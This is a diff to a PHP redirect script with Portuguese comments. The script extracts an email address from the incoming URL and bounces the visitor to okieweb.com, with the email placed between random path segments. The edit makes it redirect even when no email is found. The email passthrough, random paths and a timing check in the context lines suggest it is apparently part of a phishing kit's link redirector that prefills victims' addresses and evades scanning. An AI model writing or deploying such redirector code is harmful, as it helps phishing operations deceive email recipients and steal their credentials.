@@ -66,18 +66,6 @@ if ($sent_time && (time() - (int)$sent_time) < 3) {
     exit;
 }
 
-// Extrai email da URL
-$requestUri = $_SERVER['REQUEST_URI'];
-$email = '';
-if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $requestUri, $matches)) {
-    $email = $matches[1];
-}
-
-if (empty($email)) {
-    http_response_code(404);
-    exit;
-}
-
 $baseUrl = 'https://www.okieweb.com/';
 
 function generateSegment($length) {
@@ -89,10 +77,25 @@ function generateSegment($length) {
     return $result;
 }
 
-$urls = [
-    $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
-    $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
-];
+// Extrai email da URL
+$requestUri = $_SERVER['REQUEST_URI'];
+$email = '';
+if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $requestUri, $matches)) {
+    $email = $matches[1];
+}
+
+// Com ou sem email — sempre redireciona com segmentos randômicos
+if (!empty($email)) {
+    $urls = [
+        $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
+        $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
+    ];
+} else {
+    $urls = [
+        $baseUrl . generateSegment(8) . '/' . generateSegment(8),
+        $baseUrl . generateSegment(8) . '/' . generateSegment(8),
+    ];
+}
 
 $randomUrl = $urls[array_rand($urls)];
 header("Location: " . $randomUrl, true, 302);
